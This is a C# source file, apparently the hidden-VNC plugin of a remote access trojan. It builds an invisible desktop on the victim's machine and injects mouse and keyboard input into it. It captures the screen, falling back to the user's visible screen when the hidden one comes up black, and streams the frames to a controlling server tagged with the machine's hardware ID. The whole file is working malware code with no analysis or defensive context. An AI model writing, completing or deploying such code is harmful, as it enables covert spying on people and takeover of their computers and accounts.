using MessagePackLib.MessagePack;
using Plugin.StreamLibrary;
using Plugin.StreamLibrary.UnsafeCodecs;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace Plugin
{
    public static class Packet
    {
        public static bool IsOk { get; set; }
        public static void Read(object data)
        {
            MsgPack unpack_msgpack = new MsgPack();
            unpack_msgpack.DecodeFromBytes((byte[])data);
            switch (unpack_msgpack.ForcePathObject("Packet").AsString)
            {
                case "hvnc":
                    {
                        switch (unpack_msgpack.ForcePathObject("Option").AsString)
                        {
                            case "capture":
                                {
                                    HiddenDesktopHandler.InitializeDesktop();
                                    CaptureAndSend(Convert.ToInt32(unpack_msgpack.ForcePathObject("Quality").AsInteger));
                                    break;
                                }

                            case "mouseClick":
                                {
                                    uint buttonFlags = 0;
                                    int button = Convert.ToInt32(unpack_msgpack.ForcePathObject("Button").AsInteger);

                                    // Convert button codes to Windows message flags
                                    switch (button)
                                    {
                                        case 2: buttonFlags = 0x0002; break; // Left down
                                        case 4: buttonFlags = 0x0004; break; // Left up
                                        case 8: buttonFlags = 0x0008; break; // Right down
                                        case 16: buttonFlags = 0x0010; break; // Right up
                                    }

                                    int x = Convert.ToInt32(unpack_msgpack.ForcePathObject("X").AsInteger);
                                    int y = Convert.ToInt32(unpack_msgpack.ForcePathObject("Y").AsInteger);

                                    // Use the fixed method that doesn't switch desktops
                                    HiddenDesktopHandler.SendMouseClick(x, y, buttonFlags);
                                    break;
                                }

                            case "mouseMove":
                                {
                                    int x = Convert.ToInt32(unpack_msgpack.ForcePathObject("X").AsInteger);
                                    int y = Convert.ToInt32(unpack_msgpack.ForcePathObject("Y").AsInteger);

                                    // Send mouse move with move flag
                                    HiddenDesktopHandler.SendMouseClick(x, y, 0x0001); // MOUSEEVENTF_MOVE equivalent
                                    break;
                                }

                            case "stop":
                                {
                                    IsOk = false;
                                    HiddenDesktopHandler.DisposeDesktop();
                                    break;
                                }

                            case "keyboardClick":
                                {
                                    bool keyDown = Convert.ToBoolean(unpack_msgpack.ForcePathObject("keyIsDown").AsString);
                                    byte key = Convert.ToByte(unpack_msgpack.ForcePathObject("key").AsInteger);

                                    // Use the fixed method that doesn't switch desktops
                                    HiddenDesktopHandler.SendKeyboardInput(key, keyDown);
                                    break;
                                }
                        }
                        break;
                    }
            }
        }

        public static void CaptureAndSend(int quality) // Removed 'int Scrn'
        {
            Bitmap bmp = null;
            BitmapData bmpData = null;
            Rectangle rect;
            Size size;
            MsgPack msgpack;
            IUnsafeCodec unsafeCodec = new UnsafeStreamCodec(quality);
            MemoryStream stream;
            Thread.Sleep(1);

            // Make sure the desktop is initialized and the thread is attached
            // The call inside Screenshot() ensures this, but it's good practice to ensure the thread desktop is set.
            HiddenDesktopHandler.InitializeDesktop();

            while (IsOk && Connection.IsConnected)
            {
                try
                {
                    // === REPLACED STANDARD CAPTURE WITH HIDDEN DESKTOP CAPTURE ===
                    bmp = HiddenDesktopHandler.Screenshot();
                    // =============================================================

                    bool isMostlyBlack = true;
                    try
                    {
                        if (bmp != null && bmp.Width > 1 && bmp.Height > 1)
                        {
                            int sampleStepX = Math.Max(1, bmp.Width / 10);
                            int sampleStepY = Math.Max(1, bmp.Height / 10);
                            int checkedPixels = 0;
                            int blackPixels = 0;
                            for (int y = 0; y < bmp.Height; y += sampleStepY)
                            {
                                for (int x = 0; x < bmp.Width; x += sampleStepX)
                                {
                                    Color c = bmp.GetPixel(x, y);
                                    checkedPixels++;
                                    if (c.R < 16 && c.G < 16 && c.B < 16) blackPixels++;
                                }
                            }
                            isMostlyBlack = (checkedPixels == 0) ? true : (blackPixels * 100 / checkedPixels) >= 90;
                        }
                    }
                    catch { isMostlyBlack = true; }

                    // Fallback: try CopyFromScreen if hidden desktop produced a black image
                    if (isMostlyBlack)
                    {
                        try
                        {
                            using (Bitmap fb = new Bitmap(SystemInformation.VirtualScreen.Width, SystemInformation.VirtualScreen.Height))
                            {
                                using (Graphics g = Graphics.FromImage(fb))
                                {
                                    g.CopyFromScreen(SystemInformation.VirtualScreen.Left, SystemInformation.VirtualScreen.Top, 0, 0, fb.Size, CopyPixelOperation.SourceCopy);
                                }

                                // Replace bmp with fallback if it looks valid
                                bool fallbackValid = fb.Width > 1 && fb.Height > 1;
                                if (fallbackValid)
                                {
                                    bmp?.Dispose();
                                    bmp = (Bitmap)fb.Clone();
                                }
                            }
                        }
                        catch { /* fallback failed, likely wrong session */ }
                    }

                    if (bmp == null || bmp.Width <= 1 || bmp.Height <= 1)
                    {
                        string msg = $"HVNC: Capture failed or returned empty bitmap. SessionId={Process.GetCurrentProcess().SessionId}";
                        Debug.WriteLine(msg);

                        try
                        {
                            MsgPack log = new MsgPack();
                            log.ForcePathObject("Packet").AsString = "Logs";
                            log.ForcePathObject("Message").AsString = msg;
                            Connection.Send(log.Encode2Bytes()); // send diagnostic back to server UI
                        }
                        catch { /* best-effort, don't crash capture loop */ }

                        HiddenDesktopHandler.DisposeDesktop();
                        Thread.Sleep(500);
                        continue;
                    }

                    rect = new Rectangle(0, 0, bmp.Width, bmp.Height);
                    size = new Size(bmp.Width, bmp.Height);
                    bmpData = bmp.LockBits(new Rectangle(0, 0, bmp.Width, bmp.Height), ImageLockMode.ReadWrite, bmp.PixelFormat);

                    using (stream = new MemoryStream())
                    {
                        unsafeCodec.CodeImage(bmpData.Scan0, new Rectangle(0, 0, bmpData.Width, bmpData.Height), new Size(bmpData.Width, bmpData.Height), bmpData.PixelFormat, stream);

                        if (stream.Length > 0)
                        {
                            msgpack = new MsgPack();
                            msgpack.ForcePathObject("Packet").AsString = "hvnc";
                            msgpack.ForcePathObject("ID").AsString = Connection.Hwid;
                            msgpack.ForcePathObject("Stream").SetAsBytes(stream.ToArray());
                            // This part might need adjustment if the client expects a specific screen count from the hidden desktop.
                            msgpack.ForcePathObject("Screens").AsInteger = Convert.ToInt32(Screen.AllScreens.Length);
                            new Thread(() => { Connection.Send(msgpack.Encode2Bytes()); }).Start();
                        }
                    }
                    bmp.UnlockBits(bmpData);
                    bmp.Dispose();
                }
                catch
                {
                    Connection.Disconnected();
                    break;
                }
            }
            try
            {
                IsOk = false;
                bmp?.UnlockBits(bmpData);
                bmp?.Dispose();
                HiddenDesktopHandler.DisposeDesktop(); // Clean up the desktop after the thread finishes
                GC.Collect();
            }
            catch { }
        }

        [DllImport("user32.dll")]
        static extern void mouse_event(int dwFlags, int dx, int dy, uint dwData, int dwExtraInfo);

        [DllImport("user32.dll")]
        internal static extern bool keybd_event(byte bVk, byte bScan, uint dwFlags, UIntPtr dwExtraInfo);

        [StructLayout(LayoutKind.Sequential)]
        struct CURSORINFO
        {
            public Int32 cbSize;
            public Int32 flags;
            public IntPtr hCursor;
            public POINTAPI ptScreenPos;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct POINTAPI
        {
            public int x;
            public int y;
        }

        [DllImport("user32.dll")]
        static extern bool GetCursorInfo(out CURSORINFO pci);

        [DllImport("user32.dll")]
        internal static extern bool SetCursorPos(int x, int y);

        [DllImport("user32.dll")]
        static extern bool DrawIcon(IntPtr hDC, int X, int Y, IntPtr hIcon);
        const Int32 CURSOR_SHOWING = 0x00000001;

    }
}
